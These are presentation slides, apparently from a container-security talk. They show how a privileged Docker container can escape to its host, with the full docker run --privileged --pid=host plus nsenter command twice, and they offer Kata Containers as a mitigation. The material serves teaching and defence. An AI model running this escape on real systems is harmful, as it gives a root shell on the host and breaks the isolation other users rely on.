## Privileged Containers

Privileged containers have access to all syscalls

If able to start containers, just leave the isolation:

```bash
docker run -it \
    --privileged \
    --pid=host \
    alpine \
	nsenter -t 1 -m -u -n -i sh
```

Parameters of `nsenter`:

- Work with namespaces (nsenter)
- Uses process tree of host (--pid=host)
- Get namespace from PID 1 (-t 1)
- Enter namespaces required for shell (-m -u -n -i)

--

## Demo: Privileged Containers

Running privileged containers:

```bash
docker run -d --rm --privileged docker:stable-dind
```

Host breakout from privileged container:

```bash
docker run --rm --privileged --pid=host -it alpine:3.8 \
    nsenter -t 1 -m -u -n -i sh
```

---

## Taming Privileges Containers

### For example

![](https://katacontainers.io/assets/img/logo_white.e69d7ea6.svg) <!-- .element: style="width: 35%" -->

Isolates containers in a lightweight VM

Configured as a container runtime (instead of `runc`)